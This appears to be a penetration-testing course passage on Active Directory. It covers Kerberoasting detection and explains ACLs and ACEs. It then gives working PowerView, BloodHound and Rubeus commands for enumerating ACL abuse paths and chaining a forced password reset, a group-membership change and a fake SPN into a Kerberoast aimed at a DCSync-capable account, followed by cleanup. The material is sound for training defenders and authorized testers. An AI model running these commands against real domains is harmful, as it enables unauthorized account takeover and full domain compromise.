An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.

Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.

![image](https://academy.hackthebox.com/storage/modules/143/kerb_audit.png)

Doing so will generate two separate event IDs: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.

Below we can see an example of a Kerberoasting attack being logged. We see many event ID 4769 being logged in succession, which appears to be anomalous behavior. Clicking into one, we can see that a Kerberos service ticket was requested by the `htb-student` user (attacker) for the `sqldev` account (target). We can also see that the ticket encryption type is `0x17`, which is the hex value for 23 ( `DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256`), meaning that the requested ticket was RC4, so if the password was weak, there is a good chance that the attacker would be able to crack it and gain control of the `sqldev` account.

![image](https://academy.hackthebox.com/storage/modules/143/4769.png)

Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).

This excellent [post](https://adsecurity.org/?p=3458) by Sean Metcalf highlights some mitigation and detection strategies for Kerberoasting.

## Continuing Onwards

Now that we have a set of (hopefully privileged) credentials, we can move on to see where we can use the credentials. We may be able to:

- Access a host via RDP or WinRM as a local user or a local admin
- Authenticate to a remote host as an admin using a tool such as PsExec
- Gain access to a sensitive file share
- Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges

Regardless of our access, we will also want to dig deeper into the domain for other flaws and misconfigurations that can help us expand our access and add to our report to provide more value to our clients.


# Access Control List (ACL) Abuse Primer

* * *

For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.

* * *

## Access Control List (ACL) Overview

In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entities` ( `ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.

There are two types of ACLs:

1. `Discretionary Access Control List` ( `DACL`) \- defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.

2. `System Access Control Lists` ( `SACL`) \- allow administrators to log access attempts made to secured objects.


We see the ACL for the user account `forend` in the image below. Each item under `Permission entries` makes up the `DACL` for the user account, while the individual entries (such as `Full Control` or `Change Password`) are ACE entries showing rights granted over this user object to various users and groups.

#### Viewing forend's ACL

The SACLs can be seen within the `Auditing` tab.

#### Viewing the SACLs through the Auditing Tab

![image](https://academy.hackthebox.com/storage/modules/143/SACL_example.png)

* * *

## Access Control Entities (ACEs)

As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are `three` main types of ACEs that can be applied to all securable objects in AD:

| **ACE** | **Description** |
| --- | --- |
| `Access denied ACE` | Used within a DACL to show that a user or group is explicitly denied access to an object |
| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object |
| `System audit ACE` | Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred |

Each ACE is made up of the following `four` components:

1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object

We can view this graphically in `Active Directory Users and Computers` ( `ADUC`). In the example image below, we can see the following for the ACE entry for the user `forend`:

#### Viewing Permissions through Active Directory Users & Computers

![image](https://academy.hackthebox.com/storage/modules/143/ACE_example.png)

1. The security principal is Angela Dunn ( [\[email protected\]](/cdn-cgi/l/email-protection))
2. The ACE type is `Allow`
3. Inheritance applies to the "This object and all descendant objects,” meaning any child objects of the `forend` object would have the same permissions granted
4. The rights granted to the object, again shown graphically in this example

When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.

* * *

## Why are ACEs Important?

Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`

In this module, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:

- [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) \- gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
- [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite) \- gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
- `AddSelf` \- shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) \- this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

This graphic, adapted from a graphic created by [Charlie Bromberg (Shutdown)](https://twitter.com/_nwodtuhs), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.

![image](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)

We will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the [ReadGMSAPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readgmsapassword) edge. In this case, there are tools such as [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as [Unexpire-Password](https://learn.microsoft.com/en-us/windows/win32/adschema/r-unexpire-password) or [Reanimate-Tombstones](https://learn.microsoft.com/en-us/windows/win32/adschema/r-reanimate-tombstones) using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It's worth familiarizing yourself with all of the [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) and as many Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) as possible as you never know when you may encounter a less common one during an assessment.

* * *

## ACL Attacks in the Wild

We can use ACL attacks for:

- Lateral movement
- Privilege escalation
- Persistence

Some common attack scenarios may include:

| Attack | Description |
| --- | --- |
| `Abusing forgot password permissions` | Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain. |
| `Abusing group membership management` | It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege. |
| `Excessive user rights` | We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly. |

There are many other possible attack scenarios in the world of Active Directory ACLs, but these three are the most common. We will cover enumerating these rights in various ways, performing the attacks, and cleaning up after ourselves.

**Note:** Some ACL attacks can be considered "destructive," such as changing a user's password or performing other modifications within a client's AD domain. If in doubt, it's always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.

# ACL Enumeration

* * *

Let's jump into enumerating ACLs using PowerView and walking through some graphical representations using BloodHound. We will then cover a few scenarios/attacks where the ACEs we enumerate can be leveraged to gain us further access in the internal environment.

* * *

## Enumerating ACLs with PowerView

We can use PowerView to enumerate ACLs, but the task of digging through _all_ of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function `Find-InterestingDomainAcl` we will receive a massive amount of information back that we would need to dig through to make any sense of:

#### Using Find-InterestingDomainAcl

```powershell

If we try to dig through all of this data during a time-boxed assessment, we will likely never get through it all or find anything interesting before the assessment is over. Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over. Let's focus on the user `wley`, which we obtained after solving the last question in the `LLMNR/NBT-NS Poisoning - from Linux` section. Let's dig in and see if this user has any interesting ACL rights that we could take advantage of. We first need to get the SID of our target user to search effectively.

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley

```

We can then use the `Get-DomainObjectACL` function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the `$sid` variable to the `SecurityIdentifier` property which is what tells us _who_ has the given right over an object. One important thing to note is that if we search without the flag `ResolveGUIDs`, we will see results like the below, where the right `ExtendedRight` does not give us a clear picture of what ACE entry the user `wley` has over `damundsen`. This is because the `ObjectAceType` property is returning a GUID value that is not human readable.

Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.

#### Using Get-DomainObjectACL

```powershell
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None

```

We could Google for the GUID value `00299570-246d-11d0-a768-00aa006e0529` and uncover [this](https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.

#### Performing a Reverse Search & Mapping to a GUID Value

```powershell
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529

```

This gave us our answer, but would be highly inefficient during an assessment. PowerView has the `ResolveGUIDs` flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the `ObjectAceType` property as `User-Force-Change-Password`.

#### Using the -ResolveGUIDs Flag

```powershell
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

```

`Why did we walk through this example when we could have just searched using ResolveGUIDs first?`

It is essential that we understand what our tools are doing and have alternative methods in our toolkit in case a tool fails or is blocked. Before moving on, let's take a quick look at how we could do this using the [Get-Acl](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2) and [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlets which we may find available to us on a client system. Knowing how to perform this type of search without using a tool such as PowerView is greatly beneficial and could set us apart from our peers. We may be able to use this knowledge to achieve results when a client has us work from one of their systems, and we are restricted down to what tools are readily available on the system without the ability to pull in any of our own.

This example is not very efficient, and the command can take a long time to run, especially in a large environment. It will take much longer than the equivalent command using PowerView. In this command, we've first made a list of all domain users with the following command:

#### Creating a List of Domain Users

```powershell
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

```

We then read each line of the file using a `foreach` loop, and use the `Get-Acl` cmdlet to retrieve ACL information for each domain user by feeding each line of the `ad_users.txt` file to the `Get-ADUser` cmdlet. We then select just the `Access property`, which will give us information about access rights. Finally, we set the `IdentityReference` property to the user we are in control of (or looking to see what rights they have), in our case, `wley`.

#### A Useful foreach Loop

```powershell
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana
                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\wley
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

```

Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.

So, to recap, we started with the user `wley` and now have control over the user `damundsen` via the `User-Force-Change-Password` extended right. Let's use Powerview to hunt for where, if anywhere, control over the `damundsen` account could take us.

#### Further Enumeration of Rights Using damundsen

```powershell
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

```

Now we can see that our user `damundsen` has `GenericWrite` privileges over the `Help Desk Level 1` group. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it. A search for rights conferred upon this group does not return anything interesting.

Let's look and see if this group is nested into any other groups, remembering that nested group membership will mean that any users in group A will inherit all rights of any group that group A is nested into (a member of). A quick search shows us that the `Help Desk Level 1` group is nested into the `Information Technology` group, meaning that we can obtain any rights that the `Information Technology` group grants to its members if we just add ourselves to the `Help Desk Level 1` group where our user `damundsen` has `GenericWrite` privileges.

#### Investigating the Help Desk Level 1 Group with Get-DomainGroup

```powershell
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof
--------
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL

```

This is a lot to digest! Let's recap where we're at:

- We have control over the user `wley` whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
- We enumerated objects that the user `wley` has control over and found that we could force change the password of the user `damundsen`
- From here, we found that the `damundsen` user can add a member to the `Help Desk Level 1` group using `GenericWrite` privileges
- The `Help Desk Level 1` group is nested into the `Information Technology` group, which grants members of that group any rights provisioned to the `Information Technology` group

Now let's look around and see if members of `Information Technology` can do anything interesting. Once again, doing our search using `Get-DomainObjectACL` shows us that members of the `Information Technology` group have `GenericAll` rights over the user `adunn`, which means we could:

- Modify group membership
- Force change a password
- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak

#### Investigating the Information Technology Group

```powershell
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164

BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

```

Finally, let's see if the `adunn` user has any type of interesting access that we may be able to leverage to get closer to our goal.

#### Looking for Interesting Access

```powershell
PS C:\htb> $adunnsid = Convert-NameToSid adunn
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed

ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject

AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

<SNIP>

```

The output above shows that our `adunn` user has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the `DCSync` section.

* * *

## Enumerating ACLs with BloodHound

Now that we've enumerated the attack path using more manual methods like PowerView and built-in PowerShell cmdlets, let's look at how much easier this would have been to identify using the extremely powerful BloodHound tool. Let's take the data we gathered earlier with the SharpHound ingestor and upload it to BloodHound. Next, we can set the `wley` user as our starting node, select the `Node Info` tab and scroll down to `Outbound Control Rights`. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under `Transitive Object Control`. If we click on the `1` next to `First Degree Object Control`, we see the first set of rights that we enumerated, `ForceChangePassword` over the `damundsen` user.

#### Viewing Node Info through BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/wley_damundsen.png)

If we right-click on the line between the two objects, a menu will pop up. If we select `Help`, we will be presented with help around abusing this ACE, including:

- More info on the specific right, tools, and commands that can be used to pull off this attack
- Operational Security (Opsec) considerations
- External references.

We'll dig into this menu more later on.

#### Investigating ForceChangePassword Further

![image](https://academy.hackthebox.com/storage/modules/143/help_edge.png)

If we click on the `16` next to `Transitive Object Control`, we will see the entire path that we painstakingly enumerated above. From here, we could leverage the help menus for each edge to find ways to best pull off each attack.

#### Viewing Potential Attack Paths through BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/wley_path.png)

Finally, we can use the pre-built queries in BloodHound to confirm that the `adunn` user has DCSync rights.

#### Viewing Pre-Build queries through BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/adunn_dcsync.png)

We've now enumerated these attack paths in multiple ways. The next step will be performing this attack chain from start to finish. Let's dig in!


# ACL Abuse Tactics

* * *

## Abusing ACLs

Once again, to recap where we are and where we want to get to. We are in control of the `wley` user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the `adunn` user who can perform the DCSync attack, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. To perform the attack chain, we have to do the following:

1. Use the `wley` user to change the password for the `damundsen` user
2. Authenticate as the `damundsen` user and leverage `GenericAll` rights to add a user that we control to the `Help Desk Level 1` group
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user

So, first, we must authenticate as `wley` and force change the password of the user `damundsen`. We can start by opening a PowerShell console and authenticating as the `wley` user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0).

#### Creating a PSCredential Object

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

```

Next, we must create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user `damundsen`.

#### Creating a SecureString Object

```powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

```

Finally, we'll use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) PowerView function to change the user's password. We need to use the `-Credential` flag with the credential object we created for the `wley` user. It's best to always specify the `-Verbose` flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as `pth-net`, which is part of the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).

#### Changing the User's Password

```powershell
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset

```

We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the `wley` user that we control. Next, we need to perform a similar process to authenticate as the `damundsen` user and add ourselves to the `Help Desk Level 1` group.

#### Creating a SecureString Object using damundsen

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

```

Next, we can use the [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the `pth-toolkit`.

#### Adding damundsen to the Help Desk Level 1 Group

```powershell
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'

```

A quick check shows that our addition to the group was successful.

#### Confirming damundsen was Added to the Group

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne

```

At this point, we should be able to leverage our new group membership to take control over the `adunn` user. Now, let's say that our client permitted us to change the password of the `damundsen` user, but the `adunn` user is an admin account that cannot be interrupted. Since we have `GenericAll` rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's [servicePrincipalName attribute](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

We must be authenticated as a member of the `Information Technology` group for this to be successful. Since we added `damundsen` to the `Help Desk Level 1` group, we inherited rights via nested group membership. We can now use [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) to create the fake SPN. We could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

#### Creating a Fake SPN

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential

VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'

```

If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.

#### Kerberoasting with Rubeus

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

```

Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the `adunn` user and perform the DCSync attack, which we will cover in the next section.

* * *

## Cleanup

In terms of cleanup, there are a few things we need to do:

1. Remove the fake SPN we created on the `adunn` user.
2. Remove the `damundsen` user from the `Help Desk Level 1` group
3. Set the password for the `damundsen` user back to its original value (if we know it) or have our client set it/alert the user

This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.

First, let's remove the fake SPN from the `adunn` account.

#### Removing the Fake SPN from adunn's Account

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
